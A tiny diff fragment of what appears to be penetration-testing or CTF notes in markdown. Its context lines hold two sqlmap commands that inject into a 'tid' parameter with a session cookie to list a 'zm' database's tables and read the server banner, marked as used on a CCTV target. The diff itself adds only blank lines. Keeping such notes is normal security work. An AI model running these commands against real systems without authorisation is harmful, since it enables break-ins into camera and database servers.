@@ -38,3 +38,5 @@ sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch -D zm --tables
 sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --banner
 ```
 Used on: **CCTV**
+
+
